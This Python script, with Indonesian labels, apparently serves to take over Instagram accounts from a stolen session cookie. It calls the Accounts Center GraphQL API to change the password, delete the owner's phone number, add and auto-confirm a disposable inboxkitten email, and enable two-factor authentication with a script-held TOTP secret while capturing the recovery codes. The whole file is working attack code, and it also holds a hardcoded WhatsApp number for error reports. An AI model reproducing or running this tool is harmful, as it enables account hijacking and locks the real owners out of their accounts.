# amankan data akun ok

try:
    import os, re, sys, json, time, random, datetime, requests
    from bs4 import BeautifulSoup as bs
except(Exception, KeyboardInterrupt) as e:
    try:
        from urllib.parse import quote
        __import__('os').system(f'xdg-open https://wa.me/6285767630210?text=SECURE%20ERROR%20%3A%20{quote(str(e))}')
        exit()
    except(Exception, KeyboardInterrupt) as e:
        from urllib.parse import quote
        __import__('os').system(f'xdg-open https://wa.me/6285767630210?text=SECURE%20ERROR%20%3A%20{quote(str(e))}')
        exit()

class Require:
    def __init__(self):
        self.info = {}
        self.ses = requests.Session()

    def payload(self, curl):
        self.payload = {
            'av': re.search('{"actorID":"(\d+)"', str(curl)).group(1),
            '__d': 'www',
            '__user': '0',
            '__a':'1',
            '__req': 'h',
            '__hs': re.search('"haste_session":"(.*?)"', str(curl)).group(1),
            'dpr': '2',
            '__ccg': 'GOOD',
            '__rev': re.search('{"consistency":{"rev":(\d+)}', str(curl)).group(1),
            '__s': '',
            '__hsi': re.search('"hsi":"(\d+)"', str(curl)).group(1),
            '__dyn': '',
            '__csr': '',
            '__comet_req': re.search('__comet_req=(\d+)', str(curl)).group(1),
            'fb_dtsg': re.search('"DTSGInitialData",\[\],{"token":"(.*?)"}',str(curl)).group(1),
            'jazoest': re.search('jazoest=(\d+)', str(curl)).group(1),
            'lsd': re.search('"LSD",\[\],{"token":"(.*?)"',str(curl)).group(1),
            '__spin_r': re.search('"__spin_r":(\d+)', str(curl)).group(1),
            '__spin_b': 'trunk',
            '__spin_t': re.search('"__spin_t":(\d+)', str(curl)).group(1),
            'fb_api_caller_class': 'RelayModern'
        }
        return(self.payload)
        
    def headers(self, curl):
        self.headers = {
            'Host': 'accountscenter.instagram.com',
            'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',
            'content-type': 'application/x-www-form-urlencoded',
            'x-fb-lsd': re.search('"LSD",\[\],{"token":"(.*?)"',str(curl)).group(1)
        }
        return(self.headers)
        
    def RePassword(self, password, dancok, cookie, url='https://accountscenter.instagram.com/personal_info/contact_points/?contact_point_type=email&dialog_type=add_contact_point'):
        try:
            curl = self.ses.get(url, cookies={'cookie': cookie}).text
            self.headers = self.headers(curl)
            self.headers.update({
                'x-fb-friendly-name': 'useFXSettingsChangePasswordMutation',
                'x-ig-app-id': '1217981644879628'
            })
            self.payload = self.payload(curl)
            self.payload.update({
                'fb_api_req_friendly_name': 'useFXSettingsChangePasswordMutation',
                'variables': json.dumps({"account_id":re.search('{"actorID":"(\d+)"', str(curl)).group(1),
                "account_type": "INSTAGRAM",
                "current_password_enc": {"sensitive_string_value": '#PWD_INSTAGRAM_BROWSER:0:{}:{}'.format(int(time.time()),password)},
                "new_password_enc": {"sensitive_string_value": '#PWD_INSTAGRAM_BROWSER:0:{}:{}'.format(int(time.time()),dancok)},
                "new_password_confirm_enc": {"sensitive_string_value": '#PWD_INSTAGRAM_BROWSER:0:{}:{}'.format(int(time.time()),dancok)},
                "client_mutation_id": re.search('{"clientID":"(.*?)"}',str(curl)).group(1)}),
                'doc_id': '4872350656193366'
            })
            resp = self.ses.post('https://accountscenter.instagram.com/api/graphql/', data=self.payload, headers=self.headers, cookies={'cookie':cookie}).text
            if '"success":true' in str(resp): return dancok
        except AttributeError as e: return password
        
    def DeltPhone(self, cookie, url='https://accountscenter.instagram.com/personal_info/contact_points/?contact_point_type=email&dialog_type=add_contact_point'):
        try:
            curl = self.ses.get(url, cookies={'cookie': cookie}).text
            self.headers = self.headers(curl)
            self.headers.update({
                'x-fb-friendly-name': 'FXAccountsCenterContactPointRootQuery',
                'x-ig-app-id': '1217981644879628'
            })
            self.payload = self.payload(curl)
            self.payload.update({
                'fb_api_req_friendly_name': 'FXAccountsCenterContactPointRootQuery',
                'variables': json.dumps({"interface":"IG_WEB"}),
                'doc_id':'6253939098058154'
            })
            resp = self.ses.post('https://accountscenter.instagram.com/api/graphql/', data=self.payload, headers=self.headers, cookies={'cookie':cookie}).text
            if '"all_contact_points"' in str(resp):
                 pone = re.search('{"contact_point_type":"PHONE_NUMBER","normalized_contact_point":"(.*?)"', str(resp)).group(1)
                 self.payload.update({
                     'fb_api_req_friendly_name': 'FXAccountsCenterDeleteContactPointMutation',
                     'variables': json.dumps({"normalized_contact_point": pone,"contact_point_type":"PHONE_NUMBER","selected_accounts": re.search('{"actorID":"(\d+)"', str(curl)).group(1),"client_mutation_id":"mutation_id_1700749992848","family_device_id":"device_id_fetch_ig_did"}),'doc_id':'6716611361758391'})
                 self.headers.update({'x-fb-friendly-name': 'FXAccountsCenterDeleteContactPointMutation'})
                 confir = self.ses.post('https://accountscenter.instagram.com/api/graphql/', data=self.payload, headers=self.headers, cookies={'cookie':cookie}).text
                 if '"success":true' in str(confir): self.info.update({'Dihapus':True,'Number':pone})  
                 else: self.info.update({'Dihapus':False,'Number':pone})
            else: self.info.update({'Dihapus':False,'Number':'Kesalahan'})
        except AttributeError as e: self.info.update({'Dihapus':False,'Number':'Kesalahan'})
        return self.info
        
    def Aktifkan2F(self, cookie, url='https://accountscenter.instagram.com/personal_info/contact_points/?contact_point_type=email&dialog_type=add_contact_point'):
        try:
            curl = self.ses.get(url, cookies={'cookie': cookie}).text
            self.headers = self.headers(curl)
            self.headers.update({
                'x-fb-friendly-name': 'useFXSettingsTwoFactorGenerateTOTPKeyMutation',
                'x-ig-app-id': '1217981644879628'
            })
            self.payload = self.payload(curl)
            self.payload.update({
                'fb_api_req_friendly_name': 'useFXSettingsTwoFactorGenerateTOTPKeyMutation',
                'variables': json.dumps({"input":{"client_mutation_id": re.search('{"clientID":"(.*?)"}',str(curl)).group(1),"actor_id": re.search('{"actorID":"(\d+)"', str(curl)).group(1),"account_id": re.search('{"actorID":"(\d+)"', str(curl)).group(1),"account_type":"INSTAGRAM","device_id":"device_id_fetch_ig_did","fdid":"device_id_fetch_ig_did"}}),
                'doc_id':'6282672078501565'
            })
            resp = self.ses.post('https://accountscenter.instagram.com/api/graphql/', data=self.payload, headers=self.headers, cookies={'cookie':cookie}).text
            if "totp_key" in str(resp):
                 key_text = re.search('"key_text":"(.*?)"', str(resp)).group(1)
                 key_rep = key_text.replace(' ','')
                 kode = self.ses.get(f'https://2fa.live/tok/{key_rep}').json()['token']
                 self.info.update({'SecretKey': key_rep})
                 self.Confirm2F(cookie, kode, curl)
            else:
                 self.info.update({'SecretKey':'Tidak Ada'})
                 self.info.update({'success-a2f': False})
                 self.info.update({'kode-pemulihan':'Tidak Ada'})
        except AttributeError as e:
            self.info.update({'SecretKey':'Tidak Ada'})
            self.info.update({'success-a2f': False})
            self.info.update({'kode-pemulihan':'Tidak Ada'})
        return self.info
        
    def Confirm2F(self, cookie, kode, curl):
        try:
            self.headers.update({
                'x-fb-friendly-name': 'useFXSettingsTwoFactorEnableTOTPMutation',
                'x-ig-app-id': '1217981644879628'
            })
            self.payload.update({
                'fb_api_req_friendly_name': 'useFXSettingsTwoFactorEnableTOTPMutation','variables': json.dumps({"input":{"client_mutation_id": re.search('{"clientID":"(.*?)"}',str(curl)).group(1),"actor_id": re.search('"actorID":"(\d+)"', str(curl)).group(1),"account_id": re.search('"actorID":"(\d+)"', str(curl)).group(1),"account_type":"INSTAGRAM","verification_code": kode,"device_id":"device_id_fetch_ig_did","fdid":"device_id_fetch_ig_did"}}),
                'server_timestamps':'true',
                'doc_id':'7032881846733167'
            })
            resp = self.ses.post('https://accountscenter.instagram.com/api/graphql/', data=self.payload, headers=self.headers, cookies={'cookie':cookie}).text
            if '"success":true' in str(resp):
                 self.info.update({'success-a2f': 'Status2fa True'})
                 self.payload.update({
                     'fb_api_req_friendly_name': 'useFXSettingsTwoFactorRegenerateRecoveryCodesMutation',
                     'variables': json.dumps({"input":{"client_mutation_id": re.search('{"clientID":"(.*?)"}',str(curl)).group(1),"actor_id": re.search('"actorID":"(\d+)"', str(curl)).group(1),"account_id": re.search('"actorID":"(\d+)"', str(curl)).group(1),"account_type":"INSTAGRAM","fdid":"device_id_fetch_ig_did"}}),
                     'doc_id':'24010978991879298'
                 })
                 self.headers.update({
                     'x-fb-friendly-name': 'useFXSettingsTwoFactorRegenerateRecoveryCodesMutation'
                 })
                 reco = self.ses.post('https://accountscenter.instagram.com/api/graphql/', data=self.payload, headers=self.headers, cookies={'cookie':cookie}).text
                 if '"success":true' in str(reco):
                     code = re.search('"recovery_codes":(.*?)}', str(reco)).group(1)
                     self.info.update({'kode-pemulihan': code})
                 else: self.info.update({'kode-pemulihan':'-'})
            else:
                self.info.update({'success-a2f': False})
                self.info.update({'kode-pemulihan':'Tidak Ada'})
        except AttributeError as e:
            self.info.update({'success-a2f': False})
            self.info.update({'kode-pemulihan':'Tidak Ada'})
        return self.info
        
    def AddMail(self, cookie, url='https://accountscenter.instagram.com/personal_info/contact_points/?contact_point_type=email&dialog_type=add_contact_point'):
        try:
            mail = '%s@inboxkitten.com'%''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for i in range(5))
            curl = self.ses.get(url, cookies={'cookie': cookie}).text
            self.headers = self.headers(curl)
            self.headers.update({
                'x-fb-friendly-name': 'FXAccountsCenterAddContactPointMutation',
                'x-ig-app-id': '1217981644879628'
            })
            self.payload = self.payload(curl)
            self.payload.update({
                'fb_api_req_friendly_name': 'FXAccountsCenterAddContactPointMutation',
                'variables': json.dumps({"country":"ID","contact_point": mail,"contact_point_type":"email","selected_accounts": re.search('{"actorID":"(\d+)"', str(curl)).group(1),"family_device_id":"device_id_fetch_ig_did","client_mutation_id":"mutation_id_1700479648287"}),
                'doc_id':'6970150443042883'
            })
            resp = self.ses.post('https://accountscenter.instagram.com/api/graphql/', data=self.payload, headers=self.headers, cookies={'cookie':cookie}).text
            if '"success":true' in str(resp):
                self.info.update({'email':f'{mail}'})
                kode, url = self.ConfirMail(mail.split('@')[0])
                self.payload.update({
                    'fb_api_req_friendly_name': 'FXAccountsCenterContactPointConfirmationDialogVerifyContactPointMutation',
                    'variables': json.dumps({"contact_point": mail,"contact_point_type":"email","pin_code":f"{kode}","selected_accounts": re.search('{"actorID":"(\d+)"', str(curl)).group(1),"family_device_id":"device_id_fetch_ig_did","client_mutation_id":"mutation_id_1700481379041","contact_point_event_type":"ADD","normalized_contact_point_to_replace":""}),
                    'doc_id':'6973420842719905'
                })
                self.headers.update({
                    'x-fb-friendly-name': 'FXAccountsCenterContactPointConfirmationDialogVerifyContactPointMutation'
                })
                con = self.ses.post('https://accountscenter.instagram.com/api/graphql/', data=self.payload, headers=self.headers, cookies={'cookie':cookie}).text
                if '"success":true' in str(con): self.info.update({'di-konfirmasi':True, 'Url':url})
                else: self.info.update({'di-konfirmasi': False, 'Url':url})
            else:
                self.info.update({'di-konfirmasi': False})
                self.info.update({'email':f'{mail}','Url':None})
        except AttributeError as e:
            self.info.update({'di-konfirmasi': False})
            self.info.update({'email':f'{mail}','Url':None})
        return self.info
        
    def ConfirMail(self, email):
        while True:
           try:
               curl = self.ses.get(f'https://inboxkitten.com/api/v1/mail/list?recipient={email}').text
               key = re.search('"key":"(.*?)"', str(curl)).group(1)
               reg = re.search('"region":"(.*?)"', str(curl)).group(1)
               if len(reg) > 0 or len(reg) > 0:
                   break
           except:pass
        try:
            req = self.ses.get('https://inboxkitten.com/api/v1/mail/getHtml', params={'region': reg, 'key':key},headers={'upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5'}).text
            sdr = bs(req,'html.parser')
            for yxz in sdr.find_all('td'):
                if 'Harap konfirmasi alamat email ini agar kami dapat memperbarui informasi kontak Anda. Anda mungkin diminta untuk memasukkan kode konfirmasi ini:' in str(yxz) or 'Harap konfirmasi alamat email ini' in sdr:
                    kode = re.search('kode konfirmasi ini:(\d+)', str(yxz.text)).group(1)
                    if len(kode) >0:
                       return kode, f'https://inboxkitten.com/inbox/{email}/list'
                else: continue
        except AttributeError as e: return None, f'https://inboxkitten.com/inbox/{email}/list'
        